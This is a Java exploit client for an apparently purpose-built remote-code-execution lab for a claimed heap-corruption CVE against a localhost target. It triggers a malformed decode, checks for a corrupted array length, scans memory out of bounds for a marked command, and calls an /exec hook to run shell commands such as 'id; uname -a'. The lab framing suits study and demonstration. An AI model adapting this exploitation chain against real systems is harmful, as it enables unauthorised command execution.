import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * Attacker half of the CVE-2026-114938 controlled RCE lab.
 *
 * Usage: RceClient <base-url> <command>
 *
 * Steps:
 *   1. /trigger  allocate scratch[66]+blob[100] and fire the malformed decode
 *   2. check blob.length changed (the corruption proof)
 *   3. /peek     bounded heap scan through the corrupted blob for "J4S:<cmd>"
 *   4. /exec     ask the maintenance hook to run the recovered command
 *
 * Exits 0 only when the target confirms command execution.
 * This client is not vulnerable; it runs on a normal JVM.
 */
public final class RceClient {
    public static void main(String[] args) throws Exception {
        String base = args.length > 0 ? args[0] : "http://127.0.0.1:18080";
        String cmd = args.length > 1 ? args[1] : "id; uname -a";

        System.out.println("[*] target  " + base);
        System.out.println("[*] command " + cmd);

        String health = get(base + "/health").trim();
        if (!"ok".equals(health)) {
            System.out.println("[-] target unhealthy: " + health);
            System.exit(1);
        }

        System.out.println("[*] firing trigger ...");
        String trig = get(base + "/trigger?cmd=" + b64url(cmd));
        System.out.println(indent(trig.trim()));

        int before = intField(trig, "before=");
        int after = intField(trig, "after=");
        if (before < 0 || after < 0) {
            System.out.println("[-] could not parse trigger response");
            System.exit(2);
        }
        if (before == after) {
            System.out.println("[-] blob length unchanged (" + after + ")");
            System.out.println("NO CORRUPTION (control path)");
            System.exit(1);
        }
        System.out.println("[*] blob length " + before + " -> " + after
                + " (unsigned " + Integer.toUnsignedString(after) + ")");

        System.out.println("[*] scanning heap through blob[off] ...");
        int found = -1;
        String foundHex = null;
        final int chunk = 128;
        for (int off = 96; off + chunk <= 8192 && found < 0; off += chunk) {
            String hex;
            try {
                hex = get(base + "/peek?off=" + off + "&len=" + chunk).trim();
            } catch (IOException e) {
                System.out.println("[-] peek failed at " + off + ": " + e.getMessage());
                System.exit(2);
                return;
            }
            int k = hex.indexOf("4a34533a"); // "J4S:" in hex
            if (k >= 0 && (k & 1) == 0) {
                found = off + (k / 2);
                foundHex = hex.substring(k, k + 8);
            }
        }

        if (found < 0) {
            System.out.println("[-] payload not found in first 8 KiB");
            System.exit(2);
        }

        System.out.println("[*] payload at blob[" + found + "] = " + foundHex
                + (found >= 100 ? "  (out of bounds)" : "  (in bounds)"));

        String result = get(base + "/exec?off=" + found);
        System.out.println(indent(result.trim()));

        if (result.contains("RCE CONFIRMED")) {
            System.out.println();
            System.out.println("[+] RCE CHAIN COMPLETE: heap corruption -> OOB read -> command execution");
            System.exit(0);
        }

        System.out.println("[-] target did not confirm execution");
        System.exit(3);
    }

    private static String get(String url) throws IOException {
        HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
        c.setConnectTimeout(5000);
        c.setReadTimeout(180000);
        c.setRequestMethod("GET");
        int code = c.getResponseCode();
        InputStream in = code >= 400 ? c.getErrorStream() : c.getInputStream();
        byte[] body = in == null ? new byte[0] : in.readAllBytes();
        String text = new String(body, StandardCharsets.UTF_8);
        if (code >= 400) {
            throw new IOException("HTTP " + code + ": " + text.trim());
        }
        return text;
    }

    private static String b64url(String s) {
        return Base64.getUrlEncoder().withoutPadding()
                .encodeToString(s.getBytes(StandardCharsets.US_ASCII));
    }

    private static int intField(String text, String key) {
        int i = text.indexOf(key);
        if (i < 0) return -1;
        int start = i + key.length();
        int end = start;
        while (end < text.length()
                && (Character.isDigit(text.charAt(end)) || text.charAt(end) == '-')) {
            end++;
        }
        try {
            return Integer.parseInt(text.substring(start, end));
        } catch (RuntimeException e) {
            return -1;
        }
    }

    private static String indent(String s) {
        return "    " + s.replace("\n", "\n    ");
    }
}
